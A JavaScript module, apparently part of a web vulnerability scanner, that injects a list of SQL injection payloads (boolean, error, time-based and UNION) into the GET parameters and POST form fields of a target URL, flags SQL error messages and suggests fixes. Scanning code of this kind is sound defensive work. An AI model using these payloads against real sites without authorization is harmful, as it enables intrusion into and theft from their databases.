import axios from 'axios';
import FormData from 'form-data';

const SQL_PAYLOADS = [
  // Boolean-based
  "' OR '1'='1",
  "' OR 1=1--",
  "admin' OR '1'='1",
  // Error-based
  "' AND 1=CONVERT(int,@@version)--",
  "' AND 1=CAST((SELECT @@version) AS int)--",
  // Time-based
  "'; WAITFOR DELAY '0:0:5'--",
  "'; SELECT SLEEP(5)--",
  // UNION-based
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL,NULL--",
  "' UNION SELECT NULL,NULL,NULL--"
];

const ERROR_PATTERNS = [
  "sql syntax",
  "mysql_fetch",
  "sqlite3",
  "ORA-",
  "PostgreSQL",
  "SQL server",
  "server error in",
  "SQLSTATE",
  "microsoft sql",
  "error in your SQL"
];

export async function sqlInjectionTest(url) {
  const issues = [];
  const urlObj = new URL(url);
  
  // Test GET parameters
  const getIssues = await testGetParameters(urlObj);
  issues.push(...getIssues);
  
  // Test POST forms
  const postIssues = await testPostForms(url);
  issues.push(...postIssues);
  
  return issues;
}

async function testGetParameters(urlObj) {
  const issues = [];
  const params = new URLSearchParams(urlObj.search);
  
  for (const [param, value] of params) {
    const paramIssues = await testParameter(urlObj, param, 'GET');
    issues.push(...paramIssues);
  }
  
  return issues;
}

async function testPostForms(url) {
  const issues = [];
  
  try {
    const response = await axios.get(url);
    const forms = extractForms(response.data);
    
    for (const form of forms) {
      if (form.method.toLowerCase() === 'post') {
        for (const input of form.inputs) {
          const formIssues = await testParameter(new URL(form.action), input.name, 'POST');
          issues.push(...formIssues);
        }
      }
    }
  } catch (error) {
    // Skip if unable to fetch forms
  }
  
  return issues;
}

async function testParameter(urlObj, param, method = 'GET') {
  const issues = [];
  
  for (const payload of SQL_PAYLOADS) {
    try {
      let response;
      
      if (method === 'GET') {
        const testParams = new URLSearchParams(urlObj.search);
        testParams.set(param, payload);
        const testUrl = `${urlObj.origin}${urlObj.pathname}?${testParams}`;
        response = await axios.get(testUrl);
      } else {
        const formData = new FormData();
        formData.append(param, payload);
        response = await axios.post(urlObj.href, formData);
      }
      
      const vulnerability = detectSQLInjection(response);
      if (vulnerability) {
        issues.push({
          type: 'SQL Injection',
          issue: `Potential SQL injection in ${method} parameter: ${param}`,
          details: {
            parameter: param,
            method,
            payload,
            evidence: vulnerability.evidence
          },
          fix: getSuggestedFix(vulnerability.type)
        });
        break; // Stop testing this parameter if vulnerability found
      }
    } catch (error) {
      const vulnerability = detectSQLInjectionFromError(error);
      if (vulnerability) {
        issues.push({
          type: 'SQL Injection',
          issue: `SQL error detected in ${method} parameter: ${param}`,
          details: {
            parameter: param,
            method,
            payload,
            evidence: vulnerability.evidence
          },
          fix: getSuggestedFix(vulnerability.type)
        });
        break;
      }
    }
  }
  
  return issues;
}

function detectSQLInjection(response) {
  const responseData = response.data?.toString() || '';
  
  // Check for SQL errors in response
  for (const pattern of ERROR_PATTERNS) {
    if (responseData.toLowerCase().includes(pattern.toLowerCase())) {
      return {
        type: 'error',
        evidence: `SQL error pattern detected: ${pattern}`
      };
    }
  }
  
  // Check for successful boolean-based injection
  if (responseData.includes('admin') || responseData.includes('root')) {
    return {
      type: 'boolean',
      evidence: 'Potential authentication bypass detected'
    };
  }
  
  return null;
}

function detectSQLInjectionFromError(error) {
  const errorData = error.response?.data?.toString() || '';
  const errorMessage = error.message || '';
  
  for (const pattern of ERROR_PATTERNS) {
    if (errorData.toLowerCase().includes(pattern.toLowerCase()) ||
        errorMessage.toLowerCase().includes(pattern.toLowerCase())) {
      return {
        type: 'error',
        evidence: `SQL error in response: ${pattern}`
      };
    }
  }
  
  return null;
}

function getSuggestedFix(type) {
  const fixes = {
    error: [
      'Use parameterized queries or prepared statements',
      'Implement proper input validation',
      'Use an ORM (Object-Relational Mapping) library',
      'Enable proper error handling to avoid exposing SQL errors'
    ],
    boolean: [
      'Use parameterized queries or prepared statements',
      'Implement proper authentication mechanisms',
      'Use secure password hashing and storage',
      'Implement proper session management'
    ]
  };
  
  return fixes[type]?.join('. ') || 'Implement proper SQL injection prevention measures';
}

function extractForms(html) {
  const forms = [];
  const formRegex = /<form[^>]*action=["']([^"']*?)["'][^>]*method=["']([^"']*?)["'][^>]*>([\s\S]*?)<\/form>/gi;
  const inputRegex = /<input[^>]*name=["']([^"']*?)["'][^>]*>/gi;
  
  let formMatch;
  while ((formMatch = formRegex.exec(html)) !== null) {
    const [_, action, method, formContent] = formMatch;
    const inputs = [];
    
    let inputMatch;
    while ((inputMatch = inputRegex.exec(formContent)) !== null) {
      inputs.push({ name: inputMatch[1] });
    }
    
    forms.push({
      action: action || '',
      method: method || 'get',
      inputs
    });
  }
  
  return forms;
}